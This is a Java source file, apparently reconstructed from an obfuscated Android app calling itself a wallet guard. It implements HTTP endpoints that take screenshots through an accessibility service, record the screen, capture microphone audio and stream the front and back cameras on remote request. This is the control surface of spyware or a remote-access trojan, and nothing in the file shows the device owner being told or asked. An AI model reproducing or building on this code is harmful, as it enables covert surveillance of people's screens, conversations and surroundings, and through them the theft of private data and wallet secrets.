package com.guard.wallet.server.handler;

import com.guard.wallet.core.AppUtils;
import com.koushikdutta.async.http.server.AsyncHttpServerResponse;
import android.util.Log;
import com.guard.wallet.entity.TakeScreenShotResult;
import com.guard.wallet.server.HttpResponseHelper;
import com.guard.wallet.service.MyAccessibilityService;

/**
 * 媒体 Handler — 9 路由。
 * vendor server/b.java 中 /screenshot ... /stopCameraLive 路由。
 */
public final class MediaHandler {
    private static final String TAG = "HttpServer";

    private MediaHandler() {}

    // ─── /screenshot/0、/miniCap/scale ───

    public static void screenshot(float scale, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "screenshot scale=" + scale);
            if (!HttpResponseHelper.requireAccessibility(response)) {
                return;
            }
            TakeScreenShotResult result = MyAccessibilityService.u0();
            if (result != null && result.getSaveBytesResult() != null
                    && result.getSaveBytesResult().length > 0) {
                byte[] bytes = result.getSaveBytesResult();
                response.code(200);
                response.send("image/webp", bytes);
                return;
            }
            HttpResponseHelper.noContent(response);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /screenrecord/start ───

    public static void screenRecordStart(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "screenRecordStart");
            if (!HttpResponseHelper.requireAccessibility(response)) {
                return;
            }
            boolean result = MyAccessibilityService.P().s0();
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /screenrecord/stop ───

    public static void screenRecordStop(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "screenRecordStop");
            if (!HttpResponseHelper.requireAccessibility(response)) {
                return;
            }
            boolean result = MyAccessibilityService.P().t0();
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /screenrecord/state ───

    public static void screenRecordState(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "screenRecordState");
            if (!HttpResponseHelper.requireAccessibility(response)) {
                return;
            }
            HttpResponseHelper.ok(response, MyAccessibilityService.P().Y());
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /startRecord ───

    public static void startRecord(int audioSource, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "startRecord audioSource=" + audioSource);
            boolean result = com.guard.wallet.media.AudioRecordManager.b().d(audioSource);
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /stopRecord ───

    public static void stopRecord(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "stopRecord");
            boolean result = com.guard.wallet.media.AudioRecordManager.b().e();
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /frontCameraLive ───

    public static void frontCameraLive(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "frontCameraLive");
            HttpResponseHelper.ok(response, com.guard.wallet.camera.CameraCaptureManager.c().a(0));
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /backCameraLive ───

    public static void backCameraLive(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "backCameraLive");
            HttpResponseHelper.ok(response, com.guard.wallet.camera.CameraCaptureManager.c().a(1));
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /stopCameraLive ───

    public static void stopCameraLive(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "stopCameraLive");
            HttpResponseHelper.ok(response, com.guard.wallet.camera.CameraCaptureManager.c().e());
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }
}
